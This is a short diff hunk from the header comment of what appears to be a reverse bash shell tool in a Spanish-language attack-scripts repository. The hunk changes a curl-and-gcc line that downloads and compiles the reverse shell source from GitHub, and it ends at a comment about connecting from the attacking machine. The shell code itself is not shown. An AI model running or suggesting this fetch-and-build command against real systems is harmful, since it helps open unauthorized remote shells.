@@ -1,5 +1,5 @@
 //
-// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReverso.c > /tmp/BashReverso.c; gcc /tmp/BashReverso.c -o /root/BashReverso
+// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/TerminalReversa/Bash.c > /tmp/ReverseBash.c; gcc /tmp/ReverseBash.c -o /tmp/ReverseBash
 //
 // Conectarse desde la máquina atacante:
 //
